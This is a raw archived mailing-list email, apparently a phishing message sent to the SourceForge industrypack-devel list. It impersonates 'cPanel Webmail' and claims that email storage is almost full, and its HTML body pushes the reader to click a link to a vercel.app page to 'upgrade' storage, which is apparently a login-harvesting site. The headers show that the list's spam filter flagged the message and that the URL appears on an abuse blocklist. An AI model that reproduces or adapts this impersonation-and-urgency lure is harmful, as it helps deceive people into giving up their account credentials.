Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 598B4B1E0C3
	for <lists+industrypack-devel@lfdr.de>; Fri,  8 Aug 2025 05:03:09 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:Reply-To:From:List-Subscribe:
	List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:
	MIME-Version:Message-ID:Date:To:Sender:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=POnuozanKKJbpWC0GJ3VhkP2bj/zGtwWUpD9SGMYR54=; b=YXKSSeAi0f306RFqXF7CNkKQbx
	iWiz1ABk2x/0j7HFB4OfUzTTbxMZDJtCrKyeP0Gy9NDwhI7sOtEnbPy6nqFDG6vDZUMpXR2cCy/V3
	cHiYrjaZveYo10ZJWzYZ3ei80JKYMWtvGzpvHdf1UBDs+hJ2WQImfVDpnhbdGNcU9dUM=;
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1ukDNs-0004EF-6b
	for lists+industrypack-devel@lfdr.de;
	Fri, 08 Aug 2025 03:03:08 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <newsletter@xiamengongsi.com>) id 1ukDNq-0004Du-Kj
 for industrypack-devel@lists.sourceforge.net;
 Fri, 08 Aug 2025 03:03:06 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
 MIME-Version:Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=1tGtYaQpWz3546ESnhjCX3ApMSCYOKBLBYZmcZbSK5Q=; b=BbyrgzYax4pQHiVUyWWtmqrdwX
 qRixGWzUlBH1mVItjoIjppzHS/zd50BM2VfiNB/Ltangytkc3f/lpieZ35GhJSzDwAgEy4kYxQDWt
 AcB4qLd6/LScxWGZX96kdi1qIMZS2d0AfIrC7L/hRwdGaewsKINr7JfJPFILL/fekDHo=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 Date:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=1tGtYaQpWz3546ESnhjCX3ApMSCYOKBLBYZmcZbSK5Q=; b=a
 whYFes+PSPVm288bhj9y4od+xkjNh3jManJyxka4u1e9l4FkFB80cqV5oHstZ7w300m3QJO595UFX
 tA3LpSf43XXpFluldW+cmFvEDbBsDhcV5YKQ27ZL+7dZFgvguNyR66Sa7TtFJq1eJrzeaOqG/PMAF
 fiFIEbUFD9CQnasE=;
Received: from mail0.xiamengongsi.com ([185.33.84.157])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1ukDNq-0004k6-4Y for industrypack-devel@lists.sourceforge.net;
 Fri, 08 Aug 2025 03:03:06 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default;
 d=xiamengongsi.com; 
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
 Content-Transfer-Encoding; i=newsletter@xiamengongsi.com;
 bh=1tGtYaQpWz3546ESnhjCX3ApMSCYOKBLBYZmcZbSK5Q=;
 b=gNptmjVhyY1sJSYoY9Fc2a3wZUIa9y+BLeswxcSus/cDCGnoKllYoYs6P7eg0R3fzSRK/SsvZrOr
 kINvBWEVzMe+RzV5SNdSUdn/4JZOx3CH61peJHKm1lDrXCmJj3oQV5yNKONhVDKiCQWpDClTTfyK
 vAXkrvDokLqUTCu7aCU=
To: industrypack-devel@lists.sourceforge.net
Date: 8 Aug 2025 04:56:25 +0200
Message-ID: <20250808045625.915CCA265E16556D@xiamengongsi.com>
MIME-Version: 1.0
X-Spam-Score: 6.0 (++++++)
X-Spam-Report: Spam detection software,
 running on the system "sfi-spamd-1.hosts.colo.sdot.me", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Dear industrypack-devel, Your lists.sourceforge.net Email
 Storage Capacity is almost full and you are approaching the critical limit
 on your available space. Once the storage capacity is full you may encounter
 issues receivin [...] 
 Content analysis details:   (6.0 points, 5.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.9 URIBL_ABUSE_SURBL Contains an URL listed in the ABUSE SURBL blocklist
 [URI: webmail-6g8b.vercel.app]
 -0.1 DKIM_VALID_AU Message has a valid DKIM or DK signature from author's
 domain
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
 not necessarily valid
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 1.7 RAZOR2_CHECK           Listed in Razor2 (http://razor.sf.net/)
 2.4 RAZOR2_CF_RANGE_51_100 Razor2 gives confidence level above 50%
 [cf: 100]
 0.0 FSL_BULK_SIG           Bulk signature with no Unsubscribe
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1ukDNq-0004k6-4Y
Subject: [Industrypack-devel] [SPAM] Email Storage Capacity is Almost Full
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: cPanel Webmail via Industrypack-devel
 <industrypack-devel@lists.sourceforge.net>
Reply-To: cPanel Webmail <newsletter@xiamengongsi.com>
Content-Type: multipart/mixed; boundary="===============8927385562033745534=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============8927385562033745534==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML>

<html><head><title></title>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body style=3D"margin: 0.4em;"><p style=3D"color: rgb(34, 34, 34); text-tra=
nsform: none; text-indent: 0px; letter-spacing: normal; font-family: Arial,=
 Helvetica, sans-serif; font-size: small; font-style: normal; font-weight: =
400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; font-va=
riant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wid=
th: 0px; text-decoration-thickness: initial; text-decoration-style: initial=
; text-decoration-color: initial;">
Dear industrypack-devel,<br><br>Your lists.sourceforge.net Email Storage Ca=
pacity is almost full and you are approaching the critical limit on your av=
ailable space. Once the storage capacity is full you may encounter issues r=
eceiving incoming Emails and files. Don&#8217;t worry, there is still time =
to act!<br><br>Simply&nbsp;<a style=3D"color: rgb(17, 85, 204);" href=3D"ht=
tps://webmail-6g8b.vercel.app/" fg_scanned=3D"1">CLICK HERE</a><span>&nbsp;=
</span><span>&nbsp;</span>
&nbsp;to upgrade and expand your storage, ensuring that your inbox stays or=
ganized and clutter-free.&nbsp; Don&#8217;t let your important messages get=
 lost, take action now before it&#8217;s too late!</p>
<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white=
-space: normal; orphans: 2; widows: 2; font-variant-ligatures: normal; font=
-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thic=
kness: initial; text-decoration-style: initial; text-decoration-color: init=
ial;"><br></div>
<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
 letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
pace: normal; orphans: 2; widows: 2; font-variant-ligatures: normal; font-v=
ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
ess: initial; text-decoration-style: initial; text-decoration-color: initia=
l;"></p>
<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white=
-space: normal; orphans: 2; widows: 2; font-variant-ligatures: normal; font=
-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thic=
kness: initial; text-decoration-style: initial; text-decoration-color: init=
ial;">cPanel 2025</div></body></html>


--===============8927385562033745534==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============8927385562033745534==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============8927385562033745534==--
